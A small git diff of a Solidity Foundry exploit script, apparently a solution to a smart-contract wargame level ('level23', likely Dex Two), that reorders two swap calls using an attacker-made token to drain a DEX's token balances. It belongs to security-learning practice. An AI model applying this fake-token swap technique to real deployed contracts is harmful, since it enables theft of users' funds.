@@ -17,8 +17,8 @@ contract ExploitScript is Script {
         tokentoken.approve(address(level23),4);
         address token1 = level23.token1();
         address token2 = level23.token2();
-        level23.swap(address(tokentoken), token1, 1);
-        level23.swap(address(tokentoken), token2, 2);
+        level23.swap(address(tokentoken), token2, 1);
+        level23.swap(address(tokentoken), token1, 2);
 
         vm.stopBroadcast();
     }
